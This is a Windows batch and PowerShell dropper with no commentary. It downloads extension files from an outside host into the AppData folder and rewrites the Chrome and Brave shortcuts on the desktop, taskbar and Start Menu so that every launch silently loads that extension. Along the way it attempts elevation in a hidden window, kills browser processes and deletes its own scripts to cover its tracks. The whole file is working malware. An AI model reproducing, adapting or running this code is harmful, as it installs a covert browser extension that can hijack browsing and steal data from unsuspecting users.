@echo off
cd %appdata%
mkdir %appdata%\expansion
cd %appdata%\expansion
"%appdata%\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk"
powershell -command "(new-object System.Net.WebClient).DownloadFile('http://finandy.pro/test/fhjdkf/background.js', 'background.js')">1.txt
powershell -command "(new-object System.Net.WebClient).DownloadFile('http://finandy.pro/test/fhjdkf/ico.png', 'ico.png')">1.txt
powershell -command "(new-object System.Net.WebClient).DownloadFile('http://finandy.pro/test/fhjdkf/jquery-3.6.0.min.js', 'jquery-3.6.0.min.js')">1.txt
powershell -command "(new-object System.Net.WebClient).DownloadFile('http://finandy.pro/test/fhjdkf/manifest.json', 'manifest.json')">1.txt
powershell -command "(new-object System.Net.WebClient).DownloadFile('http://finandy.pro/test/fhjdkf/shadow_vpn.html', 'shadow_vpn.html')">1.txt
powershell -command "(new-object System.Net.WebClient).DownloadFile('http://finandy.pro/test/fhjdkf/vpn.js', 'vpn.js')">1.txt

echo $AppdataPath = "%appdata%">>1.ps1
cd %userprofile%
cd ..
cd public\desktop
echo $DesktopPathall = "%cd%">>%appdata%\expansion\1.ps1
cd %appdata%\expansion
echo $progdata = "%programdata%">>1.ps1
echo $oi = 00>>1.ps1
echo $files = $DesktopPathall+"\Google Chrome.lnk">>1.ps1
echo $files2 = $AppdataPath+"\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\Google Chrome.lnk">>1.ps1
echo $files3 = $AppdataPath+"\Microsoft\Internet Explorer\Quick Launch\Google Chrome.lnk">>1.ps1
echo $files4 = $progdata+"\Microsoft\Windows\Start Menu\Programs\Google Chrome.lnk">>1.ps1


echo if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(`>>1.ps1
echo [Security.Principal.WindowsBuiltInRole] "Administrator")) {>>1.ps1

echo $file = $DesktopPathall+"\Google Chrome.lnk">>1.ps1
echo $file2 = "%cd%\Google Chrome.lnk">>1.ps1
echo $DesktopPath = "%userprofile%\desktop">>1.ps1
echo if (!(Test-Path $file)) { #if the file is not there in either of the folder>>1.ps1

echo   } else {>>1.ps1

echo $file = "" + $file + "">>1.ps1
echo $AppdataPath2 = "" + $AppdataPath + "\Google Chrome.lnk" + "">>1.ps1
echo Copy-Item $file -Destination $AppdataPath>>1.ps1
echo Del $file>>1.ps1
echo $DesktopPath2 = "" + $DesktopPath + "\" + "Google Chrome.lnk" + "">>1.ps1
echo Copy-Item $AppdataPath2 -Destination $DesktopPath2>>1.ps1
echo $shell = New-Object -COM WScript.Shell>>1.ps1
echo $shortcut = $shell.CreateShortcut($DesktopPath2)>>1.ps1
echo $shortcut.Arguments = "--load-extension=" + $AppdataPath + "\expansion">>1.ps1
echo $shortcut.Save()>>1.ps1
echo Stop-Process -Name chrome>>1.ps1
echo $oi = 11>>1.ps1
echo }>>1.ps1
echo $file = $DesktopPathall+"\Brave.lnk">>1.ps1
echo $file2 = "%cd%\Brave.lnk">>1.ps1
echo if (!(Test-Path $file)) { #if the file is not there in either of the folder>>1.ps1

echo   } else {>>1.ps1

echo $file = "" + $file + "">>1.ps1
echo $AppdataPath2 = "" + $AppdataPath + "\Brave.lnk" + "">>1.ps1
echo     Copy-Item $file -Destination $AppdataPath>>1.ps1
echo Del $file>>1.ps1
echo $DesktopPath3 = "" + $DesktopPath + "\" + "Brave.lnk" + "">>1.ps1
echo Copy-Item $AppdataPath2 -Destination $DesktopPath3>>1.ps1
echo $shell = New-Object -COM WScript.Shell>>1.ps1
echo $shortcut = $shell.CreateShortcut($DesktopPath3)>>1.ps1
echo $shortcut.Arguments = "--load-extension=" + $AppdataPath + "\expansion">>1.ps1
echo $shortcut.Save()>>1.ps1
echo Stop-Process -Name chrome>>1.ps1
echo $oi = 11>>1.ps1
echo }>>1.ps1

echo   } else {>>1.ps1

echo if (!(Test-Path $files)) { #if the file is not there in either of the folder>>1.ps1
echo   } else {>>1.ps1
echo   Stop-Process -Name chrome>>1.ps1
echo $files = "" + $files + "">>1.ps1
echo $shell = New-Object -COM WScript.Shell>>1.ps1
echo $shortcut = $shell.CreateShortcut($files)>>1.ps1
echo $shortcut.Arguments = "--load-extension=" + $AppdataPath + "\expansion">>1.ps1
echo $shortcut.Save()>>1.ps1
echo $oi = 11>>1.ps1
echo }>>1.ps1

echo if (!(Test-Path $files2)) { #if the file is not there in either of the folder>>1.ps1
echo   } else {>>1.ps1
echo   Stop-Process -Name chrome>>1.ps1
echo $files2 = "" + $files2 + "">>1.ps1
echo $shell = New-Object -COM WScript.Shell>>1.ps1
echo $shortcut = $shell.CreateShortcut($files2)>>1.ps1
echo $shortcut.Arguments = "--load-extension=" + $AppdataPath + "\expansion">>1.ps1
echo $shortcut.Save()>>1.ps1
echo $oi = 11>>1.ps1
echo }>>1.ps1

echo if (!(Test-Path $files3)) { #if the file is not there in either of the folder>>1.ps1
echo   } else {>>1.ps1
echo   Stop-Process -Name chrome>>1.ps1
echo $files3 = "" + $files3 + "">>1.ps1
echo $shell = New-Object -COM WScript.Shell>>1.ps1
echo $shortcut = $shell.CreateShortcut($files3)>>1.ps1
echo $shortcut.Arguments = "--load-extension=" + $AppdataPath + "\expansion">>1.ps1
echo $shortcut.Save()>>1.ps1
echo $oi = 11>>1.ps1
echo }>>1.ps1

echo if (!(Test-Path $files4)) { #if the file is not there in either of the folder>>1.ps1
echo   } else {>>1.ps1
echo   Stop-Process -Name chrome>>1.ps1
echo $files4 = "" + $files4 + "">>1.ps1
echo $shell = New-Object -COM WScript.Shell>>1.ps1
echo $shortcut = $shell.CreateShortcut($files4)>>1.ps1
echo $shortcut.Arguments = "--load-extension=" + $AppdataPath + "\expansion">>1.ps1
echo $shortcut.Save()>>1.ps1
echo $oi = 11>>1.ps1
echo }>>1.ps1


echo $files = $DesktopPathall+"\Brave.lnk">>1.ps1

echo $files2 = $AppdataPath+"\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\Brave.lnk">>1.ps1
echo $files3 = $AppdataPath+"\Microsoft\Internet Explorer\Quick Launch\Brave.lnk">>1.ps1
echo $files4 = $progdata+"\Microsoft\Windows\Start Menu\Programs\Brave.lnk">>1.ps1




echo if (!(Test-Path $files)) { #if the file is not there in either of the folder>>1.ps1
echo   } else {>>1.ps1
echo   Stop-Process -Name Brave>>1.ps1
echo $files = "" + $files + "">>1.ps1
echo $shell = New-Object -COM WScript.Shell>>1.ps1
echo $shortcut = $shell.CreateShortcut($files)>>1.ps1
echo $shortcut.Arguments = "--load-extension=" + $AppdataPath + "\expansion">>1.ps1
echo $shortcut.Save()>>1.ps1
echo $oi = 11>>1.ps1
echo }>>1.ps1

echo if (!(Test-Path $files2)) { #if the file is not there in either of the folder>>1.ps1
echo   } else {>>1.ps1
echo   Stop-Process -Name Brave>>1.ps1
echo $files2 = "" + $files2 + "">>1.ps1
echo $shell = New-Object -COM WScript.Shell>>1.ps1
echo $shortcut = $shell.CreateShortcut($files2)>>1.ps1
echo $shortcut.Arguments = "--load-extension=" + $AppdataPath + "\expansion">>1.ps1
echo $shortcut.Save()>>1.ps1
echo $oi = 11>>1.ps1
echo }>>1.ps1

echo if (!(Test-Path $files3)) { #if the file is not there in either of the folder>>1.ps1
echo   } else {>>1.ps1
echo   Stop-Process -Name Brave>>1.ps1
echo $files3 = "" + $files3 + "">>1.ps1
echo $shell = New-Object -COM WScript.Shell>>1.ps1
echo $shortcut = $shell.CreateShortcut($files3)>>1.ps1
echo $shortcut.Arguments = "--load-extension=" + $AppdataPath + "\expansion">>1.ps1
echo $shortcut.Save()>>1.ps1
echo $oi = 11>>1.ps1
echo }>>1.ps1

echo if (!(Test-Path $files4)) { #if the file is not there in either of the folder>>1.ps1
echo   } else {>>1.ps1
echo   Stop-Process -Name Brave>>1.ps1
echo $files4 = "" + $files4 + "">>1.ps1
echo $shell = New-Object -COM WScript.Shell>>1.ps1
echo $shortcut = $shell.CreateShortcut($files4)>>1.ps1
echo $shortcut.Arguments = "--load-extension=" + $AppdataPath + "\expansion">>1.ps1
echo $shortcut.Save()>>1.ps1
echo $oi = 11>>1.ps1
echo }>>1.ps1
echo }>>1.ps1

echo if ($oi -eq 00)>>1.ps1
echo {>>1.ps1
echo (Get-ChildItem %cd%\).Delete()>>1.ps1
echo }>>1.ps1
echo Remove-item %cd%\1.ps1>>1.ps1
echo Remove-item %cd%\2.ps1>>1.ps1

echo $coca = (Start-Process -WindowStyle hidden "cmd" -ArgumentList '/c Powershell.exe -executionpolicy remotesigned -File %cd%\1.ps1' -verb runas -PassThru).Id>>%cd%\2.ps1
echo if ( $coca -eq $null )>>%cd%\2.ps1
echo {>>%cd%\2.ps1
echo Powershell.exe -executionpolicy remotesigned -File %cd%\1.ps1>>%cd%\2.ps1
echo }>>%cd%\2.ps1

Powershell.exe -executionpolicy remotesigned -File %cd%\2.ps1
